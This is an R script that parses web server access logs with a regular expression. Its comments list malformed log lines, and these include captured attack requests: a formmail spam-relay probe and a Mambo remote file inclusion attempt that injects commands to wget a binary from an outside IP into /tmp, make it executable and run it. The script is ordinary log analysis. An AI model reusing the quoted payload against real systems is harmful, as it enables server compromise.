jan = readLines("AnsonJanuary.log")
tmp = gsub('(.*) - (-|Aejasa|admin|polonik|kerr|mom|shumway) \\[(.*) -[0-9]*\\] "(.*) (.*) (HTTP|FTP)/(1\\.[01])" (-|[0-9]+) (-|[0-9]+)',
             "\\1;; \\3;; \\4;; \\5;; \\6;; \\7;; \\8;; \\9", 
             jan)
#rm(jan)
els = strsplit(tmp, ";; ")
len = sapply(els, length)

#
jan[len != 8]
# Many of the form 222.122.194.84 - - [26/Jan/2006:00:15:23 -0800] \"\" 501 751
# A few - sharesly
# One "193.220.52.203 - - [19/Jan/2005:19:40:52 -0800] \"      "
#  i.e. empty query.

# Some "24.131.146.34 - - [16/Jan/2005:06:21:13 -0800] \"GET /cgi-bin/formmail.pl?email=f2%40aol%2Ecom&subject=www%2Dstat%2Eucdavis%2Eedu%2Fcgi%2Dbin%2Fformmail%2Epl&recipient=bluntsmoker%5Fx%40yahoo%2Ecom&msg=w00t HTTP/1.1Content-Type: application/x-www-form-urlencoded\" 404 814"
# i.e. with the HTTP/1.1Content-Type....
#
# And some "200.14.96.57 - - [10/Jan/2006:19:49:08 -0800] \"GET /php/mambo/index2.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://209.136.48.69/cmd.gif?&cmd=cd%20/tmp;wget%20209.136.48.69/micu;chmod%20744%20micu;./micu;echo%20YYY;echo|  HTTP\001.1\" 404 811"
# which when cat()'ed to the screen gives a HTTP^A.1 rather than than HTTP/1.1